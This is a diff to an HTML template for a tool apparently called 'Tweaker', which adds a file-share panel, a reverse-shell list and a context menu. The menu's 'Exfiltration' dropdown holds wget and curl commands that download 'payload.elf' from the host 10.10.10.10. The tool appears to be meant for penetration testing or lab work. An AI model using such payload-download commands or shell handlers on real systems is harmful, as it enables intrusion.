@@ -1,7 +1,40 @@
 {{ define "title" }}Tweaker{{ end }}
 
 {{ define "content" }}
-<div class="container">
-    <h1>Tweaker</h1>
+<div id="app-content">
+    <!-- Section Toggle inside App -->
+    <div class="tabs">
+      <div id="tab-files" class="tab active">File Share</div>
+      <div id="tab-shells" class="tab">Reverse Shells</div>
+    </div>
+    <div id="file-share" class="content">
+      <button id="upload-btn" class="file-share-button">Upload File</button>
+      <button id="newdir-btn" class="file-share-button">New Folder</button>
+      <ul id="file-list">
+        <!-- Dynamically populated -->
+      </ul>
+    </div>
+    <div id="shell-handler" class="content hidden">
+      <ul id="shell-list">
+        <!-- Dynamically populated -->
+      </ul>
+    </div>
+  </div>
+  <!-- Context Menu -->
+  <nav id="ctx-menu" class="context-menu">
+    <ul>
+      <li data-action="copy">Copy</li>
+      <li data-action="rename">Rename</li>
+      <li data-action="delete">Delete</li>
+      <li class="dropdown">Exfiltration
+        <ul class="dropdown-menu">
+          <li data-method="method1">wget 10.10.10.10/payload.elf -O payload.elf</li>
+          <li data-method="method2">curl 10.10.10.10/payload.elf -o payload.elf</li>
+          <!-- Add more methods -->
+        </ul>
+      </li>
+    </ul>
+  </nav>
 </div>
+<script src="/static/js/script.js"></script>
 {{ end }}
